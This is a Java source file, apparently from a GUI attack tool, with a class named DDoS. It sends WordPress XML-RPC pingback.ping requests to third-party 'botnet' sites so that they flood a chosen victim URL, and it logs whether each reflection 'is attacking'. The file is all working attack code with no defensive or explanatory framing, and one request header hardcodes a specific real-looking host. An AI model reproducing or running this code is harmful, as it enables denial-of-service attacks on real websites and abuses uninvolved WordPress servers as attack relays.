/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Exploit;

import View.Main;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 *
 * @author ShacoJX
 */
public class DDoS {
    OkHttpClient client = new OkHttpClient().newBuilder()
                        .connectTimeout(30, TimeUnit.SECONDS)
                        .readTimeout(30, TimeUnit.SECONDS)
                        .writeTimeout(30, TimeUnit.SECONDS)
                        .build();
    public void Attack(String victim, String botnet){
        try {
            String ketqua = "";
            String[] listxxx = botnet.split("/");
            String urlx = listxxx[0]+"//"+listxxx[2]+"/xmlrpc.php";      
            
            MediaType mediaType = MediaType.parse("text/plain");
            RequestBody body = RequestBody.create(mediaType, "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>"+victim+"</string></value></param><param><value><string>"+botnet+"</string></value></param></params></methodCall>");
            Request request = new Request.Builder()
                    .url(urlx)
                    .method("POST", body)
                    .addHeader("Host", "forex.com.vn")
                    .addHeader("Cache-Control", "max-age=0")
                    .addHeader("Sec-Ch-Ua", "\"Chromium\";v=\"91\", \" Not;A Brand\";v=\"99\"")
                    .addHeader("Sec-Ch-Ua-Mobile", "?0")
                    .addHeader("Upgrade-Insecure-Requests", "1")
                    .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36")
                    .addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
                    .addHeader("Sec-Fetch-Site", "none")
                    .addHeader("Sec-Fetch-Mode", "navigate")
                    .addHeader("Sec-Fetch-User", "?1")
                    .addHeader("Sec-Fetch-Dest", "document")
                    .addHeader("Accept-Encoding", "utf-8, text")
                    .addHeader("Accept-Language", "en-US,en;q=0.9")
                    .addHeader("Connection", "close")
                    .addHeader("Content-Length", "279")
                    .addHeader("Content-Type", "text/plain")
                    .build();
            Response response = client.newCall(request).execute();
            String outkp = response.body().string();
            if(outkp.contains("<value><int>0</int></value>")){
                ketqua = urlx+" attacking ";
            }else{
                ketqua = urlx+" attack fail";
            }
            ghilog(ketqua);
        } catch (IOException ex) {
            Logger.getLogger(DDoS.class.getName()).log(Level.SEVERE, null, ex);
        }
        
    }
    
public void ghilog(String message) {
        new Thread(()-> {
             Main.logddos.append("\n" + message);
        }).start();
    }
    
}
